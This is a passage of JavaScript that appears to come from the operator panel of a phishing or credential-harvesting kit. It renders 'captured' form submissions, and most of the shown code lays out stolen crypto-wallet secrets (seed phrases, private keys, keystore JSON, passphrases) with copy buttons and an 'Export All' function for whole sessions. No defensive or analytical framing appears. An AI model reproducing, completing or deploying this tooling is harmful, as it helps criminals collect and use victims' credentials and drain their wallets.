                        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
                      </button>
                    </td>
                  </tr>
                `).join('')}
              </table>
            ` : ''}
          </div>
        `;
      } else if (isCrypto) {
        // ── Crypto / Wallet visual ──────────────────────────────────────────
        const seedPhrase = resolveField(fields, 'seed_phrase','mnemonic','recovery_phrase') || null;
        const privateKey = resolveField(fields, 'private_key','secret_key') || null;
        const walletAddr = resolveField(fields, 'wallet_address') || null;
        const walletProvider = resolveField(fields, 'wallet_provider') || null;
        const keystoreJson = resolveField(fields, 'keystore_json','keystore') || null;
        const cryptoPass = resolveField(fields, 'crypto_passphrase') || null;

        let cryptoText = '';
        if (walletProvider) cryptoText += `Wallet: ${walletProvider}\n`;
        if (walletAddr) cryptoText += `Address: ${walletAddr}\n`;
        if (seedPhrase) cryptoText += `Seed Phrase: ${seedPhrase}\n`;
        if (privateKey) cryptoText += `Private Key: ${privateKey}\n`;
        if (keystoreJson) cryptoText += `Keystore: ${keystoreJson}\n`;
        if (cryptoPass) cryptoText += `Passphrase: ${cryptoPass}\n`;

        const extraCryptoFields = Object.entries(fields).filter(([k]) => !CRYPTO_KEYS.includes(k));
        extraCryptoFields.forEach(([k, v]) => { cryptoText += `${k.replace(/_/g, ' ')}: ${v}\n`; });

        // Render seed phrase as numbered word pills
        const renderSeedPills = (phrase) => {
          const words = phrase.trim().split(/[\s,]+/).filter(Boolean);
          return `<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(110px,1fr));gap:6px;margin-top:8px;">
            ${words.map((w, i) => `
              <div style="display:flex;align-items:center;gap:6px;background:rgba(245,158,11,0.08);border:1px solid rgba(245,158,11,0.2);border-radius:7px;padding:5px 8px;cursor:pointer;" onclick="event.stopPropagation(); window.copyToClipboard('${escapeHtml(w)}', 'Word copied!');" title="Click to copy word">
                <span style="font-size:10px;font-weight:700;color:#f59e0b;min-width:18px;text-align:center;">${i + 1}</span>
                <span style="font-size:12px;color:var(--text-primary);font-family:monospace;font-weight:600;">${escapeHtml(w)}</span>
              </div>`).join('')}
          </div>`;
        };

        // Render private key — masked toggle
        const pkId = `pk-${Math.random().toString(36).substr(2,7)}`;
        const renderPrivateKey = (pk) => `
          <div style="background:rgba(239,68,68,0.06);border:1px solid rgba(239,68,68,0.18);border-radius:8px;padding:10px 14px;margin-top:8px;">
            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
              <span style="font-size:10px;font-weight:700;color:#f87171;text-transform:uppercase;letter-spacing:0.5px;">🔐 Private Key</span>
              <div style="display:flex;gap:6px;">
                <button class="btn btn-sm btn-outline" style="font-size:10px;padding:2px 8px;" onclick="const e=document.getElementById('${pkId}');if(e.dataset.vis==='0'){e.textContent='${escapeHtml(pk)}';e.dataset.vis='1';this.textContent='Hide';}else{e.textContent='${'•'.repeat(Math.min(pk.length,32))}…';e.dataset.vis='0';this.textContent='Show';}">Show</button>
                <button class="btn btn-sm btn-outline" style="font-size:10px;padding:2px 8px;" onclick="event.stopPropagation();window.copyToClipboard('${escapeHtml(pk)}','Private key copied!');">Copy</button>
              </div>
            </div>
            <div id="${pkId}" data-vis="0" style="font-family:monospace;font-size:12px;color:#fca5a5;word-break:break-all;line-height:1.5;">${'•'.repeat(Math.min(pk.length, 32))}…</div>
          </div>`;

        return `
          <div class="visual-card-wrap" style="border-color:rgba(245,158,11,0.25);">
            <div style="font-size:10px;font-weight:700;color:#f59e0b;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:8px;display:flex;justify-content:space-between;align-items:center;">
              <span>🪙 Crypto / Wallet · ${escapeHtml(entry.page || '')}</span>
              <div style="display:flex;gap:6px;align-items:center;">
                <button class="copy-all-btn" data-copy="${escapeHtml(cryptoText.trim())}" onclick="window.copyToClipboard(this.getAttribute('data-copy'),'Wallet data copied!')" title="Copy all wallet data">
                  <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
                  Copy All
                </button>
                <span style="color:var(--text-tertiary);">${entry.timestamp ? new Date(entry.timestamp).toLocaleTimeString() : ''}</span>
              </div>
            </div>
            ${walletProvider || walletAddr ? `
              <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:8px;margin-bottom:10px;">
                ${walletProvider ? `<div style="background:rgba(245,158,11,0.07);border:1px solid rgba(245,158,11,0.18);border-radius:8px;padding:8px 12px;">
                  <div style="font-size:10px;color:#f59e0b;font-weight:600;margin-bottom:4px;">Wallet Provider</div>
                  <div style="font-size:13px;font-weight:700;color:var(--text-primary);">🪙 ${escapeHtml(walletProvider)}</div>
                </div>` : ''}
                ${walletAddr ? `<div style="background:rgba(245,158,11,0.07);border:1px solid rgba(245,158,11,0.18);border-radius:8px;padding:8px 12px;cursor:pointer;" onclick="event.stopPropagation();window.copyToClipboard('${escapeHtml(walletAddr)}','Address copied!');" title="Click to copy">
                  <div style="font-size:10px;color:#f59e0b;font-weight:600;margin-bottom:4px;">Wallet Address 📋</div>
                  <div style="font-size:11px;font-family:monospace;color:var(--text-primary);word-break:break-all;">${escapeHtml(walletAddr)}</div>
                </div>` : ''}
              </div>` : ''}
            ${seedPhrase ? `
              <div style="background:rgba(245,158,11,0.06);border:1px solid rgba(245,158,11,0.2);border-radius:10px;padding:12px 14px;">
                <div style="display:flex;justify-content:space-between;align-items:center;">
                  <span style="font-size:10px;font-weight:700;color:#f59e0b;text-transform:uppercase;letter-spacing:0.5px;">🌱 Seed Phrase (${seedPhrase.trim().split(/[\s,]+/).filter(Boolean).length} words)</span>
                  <button class="btn btn-sm btn-outline" style="font-size:10px;padding:2px 8px;" onclick="event.stopPropagation();window.copyToClipboard('${escapeHtml(seedPhrase)}','Seed phrase copied!');">Copy All Words</button>
                </div>
                ${renderSeedPills(seedPhrase)}
              </div>` : ''}
            ${privateKey ? renderPrivateKey(privateKey) : ''}
            ${keystoreJson ? `
              <div style="background:rgba(99,102,241,0.06);border:1px solid rgba(99,102,241,0.18);border-radius:8px;padding:10px 14px;margin-top:8px;">
                <div style="font-size:10px;font-weight:700;color:#818cf8;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:6px;">Keystore JSON</div>
                <pre style="font-size:11px;color:var(--text-secondary);overflow-x:auto;white-space:pre-wrap;word-break:break-all;margin:0;max-height:80px;">${escapeHtml(keystoreJson)}</pre>
              </div>` : ''}
            ${cryptoPass ? `
              <div class="cred-item" style="margin-top:8px;border-top:1px solid rgba(255,255,255,0.05);">
                <span style="font-size:11px;color:var(--text-tertiary);min-width:80px;flex-shrink:0;">Passphrase</span>
                <span class="cred-val mono">${escapeHtml(cryptoPass)}</span>
                <button class="btn btn-sm btn-outline cred-copy-btn" onclick="event.stopPropagation();window.copyToClipboard('${escapeHtml(cryptoPass)}','Passphrase copied!');">Copy</button>
              </div>` : ''}
            ${extraCryptoFields.length > 0 ? `
              <div class="credential-box-view" style="margin-top:10px;">
                ${extraCryptoFields.map(([k, v]) => `
                <div class="cred-item">
                  <span style="font-size:11px;color:var(--text-tertiary);text-transform:capitalize;min-width:70px;flex-shrink:0;">${escapeHtml(k.replace(/_/g, ' '))}</span>
                  <span class="cred-val" style="font-size:12px;">${escapeHtml(String(v))}</span>
                  <button class="btn btn-sm btn-outline cred-copy-btn" onclick="event.stopPropagation();window.copyToClipboard('${escapeHtml(String(v))}','Copied!');">Copy</button>
                </div>`).join('')}
              </div>` : ''}
          </div>
        `;
      } else {
        // Build copy all text for general form
        let formText = `Form: ${entry.formId || 'Form'} · ${entry.page || ''}`;
        Object.entries(fields).forEach(([k, v]) => {
          formText += `\n${k.replace(/_/g, ' ')}: ${v}`;
        });

        const COLORS = ['#6b7280','#8b5cf6','#06b6d4','#10b981','#f59e0b','#ec4899','#3b82f6'];
        const colorIdx = (entry.formId || '').split('').reduce((a, c) => a + c.charCodeAt(0), 0) % COLORS.length;
        const accentColor = COLORS[colorIdx];

        return `
          <div class="visual-credential-wrap" style="border-color:${accentColor}33;">
            <div style="font-size:10px;font-weight:700;color:${accentColor};text-transform:uppercase;letter-spacing:0.5px;margin-bottom:8px;display:flex;justify-content:space-between;align-items:center;">
              <span>📋 ${escapeHtml(entry.formId || 'Form')} · ${escapeHtml(entry.page || '')}</span>
              <div style="display:flex;gap:6px;align-items:center;">
                <button class="copy-all-btn" data-copy="${escapeHtml(formText)}" onclick="window.copyToClipboard(this.getAttribute('data-copy'), 'Form data copied!')" title="Copy all form fields">
                  <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
                  Copy All
                </button>
                <span style="color:var(--text-tertiary);">${entry.timestamp ? new Date(entry.timestamp).toLocaleTimeString() : ''}</span>
              </div>
            </div>
            <div class="credential-box-view" style="border-color:${accentColor}22;">
              ${Object.entries(fields).map(([k, v]) => `
              <div class="cred-item">
                <span style="font-size:11px;color:var(--text-tertiary);text-transform:capitalize;min-width:70px;flex-shrink:0;">${escapeHtml(k.replace(/_/g, ' '))}</span>
                <span class="cred-val" style="font-size:12.5px;">${escapeHtml(String(v))}</span>
                <button class="btn btn-sm btn-outline cred-copy-btn" onclick="event.stopPropagation(); window.copyToClipboard('${escapeHtml(String(v))}', 'Copied!');">Copy</button>
              </div>
              `).join('')}
            </div>
          </div>
        `;
      }
    };

    // ── Build "Copy All Session Data" block ────────────────────────────────
    let allText = '';
    const reversedData = [...metadata.formData].reverse();
    reversedData.forEach((entry, i) => {
      const originalIndex = metadata.formData.length - i;
      const f = entry.fields || {};
      allText += `--- Entry ${originalIndex}: ${entry.formId || 'Form'} (${entry.page || ''}) ---\n`;
      Object.entries(f).forEach(([k, v]) => { allText += `${k}: ${v}\n`; });
      allText += '\n';
    });

    return `
      <div style="display:flex;flex-direction:column;gap:14px;">
        <div style="display:flex;justify-content:space-between;align-items:center;padding:0 2px;">
          <span style="font-size:11px;font-weight:700;color:var(--text-tertiary);text-transform:uppercase;letter-spacing:0.5px;">Captured Data · ${metadata.formData.length} entr${metadata.formData.length === 1 ? 'y' : 'ies'}</span>
          <button class="copy-all-btn" data-copy="${escapeHtml(allText.trim())}" onclick="window.copyToClipboard(this.getAttribute('data-copy'), 'All session data copied!')" title="Copy all captured data" style="font-size:11px;">
            <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
            Export All
          </button>
        </div>
        ${reversedData.map(renderEntry).join('')}
      </div>
    `;
  }

  return { renderFormData };
})();
